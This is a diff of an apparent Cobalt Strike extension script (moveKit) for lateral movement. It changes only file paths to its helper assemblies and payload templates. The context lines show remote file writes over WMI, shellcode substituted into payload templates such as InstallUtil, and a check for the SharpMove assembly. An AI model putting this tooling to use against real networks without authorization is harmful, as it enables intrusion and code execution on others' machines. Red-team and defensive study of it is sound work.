@@ -223,7 +223,7 @@ sub moveKit::compilepl{
 	}
 
 	if($desc ismatch '^InstallUtil.*'){
-		$saveas = script_resource("Templates/InstallUtil.exe");
+		$saveas = script_resource("/opt/cobalt_strike_extension_kit/exe/InstallUtil.exe");
 		$refs = "/reference:System.Configuration.Install";
 	}
 	else if($desc ismatch '^NonPreBuiltCustom.*'){
@@ -429,7 +429,7 @@ sub moveKit::writeonlyhandler{
 	($drive, $path) = split(':', $gen['droplocation']);
 	if($gen['writetype'] ismatch "^WMI.*"){
 		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
-		bexecute_assembly($bid, script_resource("/exe/dfw.exe"), $writeargs);
+		bexecute_assembly($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/dfw.exe"), $writeargs);
 		bpause($bid, 8000);
 		return;
 	}
@@ -788,7 +788,7 @@ sub moveKit::makeplandhost{
 			}
 		}
 	}
-	$outpl = openf(script_resource("Templates/$template"));
+	$outpl = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/$template"));
 	$data = readb($outpl, -1);
 	closef($outpl);
 	$finalpayload = strrep($data, %movedefaults["findstring"], $finshellc);
@@ -855,7 +855,7 @@ sub moveKit::payloadbuilder{
 			}
 		}
 	}
-	$outpl = openf(script_resource("Templates/$template"));
+	$outpl = openf(script_resource("/opt/cobalt_strike_extension_kit/exe/$template"));
 	$data = readb($outpl, -1);
 	closef($outpl);
 	$noncompiled = strrep($data, %moveKit::movedefaults["findstring"], $finshellc);
@@ -948,7 +948,7 @@ sub moveKit::filewrite{
 
 	if($writetype eq "WMI"){
 		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
-		bexecute_assembly!($bid, script_resource("/exe/dfw.exe"), $fwargs);
+		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/dfw.exe"), $fwargs);
 		bpause($bid, 8000);
 		return;
 	}
@@ -1076,7 +1076,7 @@ sub moveKit::prechecks{
 		}
 	}
 	else{
-		if(!-exists script_resource("Assemblies/SharpMove.exe")){
+		if(!-exists script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe")){
 			show_error("The SharpMove assembly is required for this command trigger type");
 			exit();
 		}
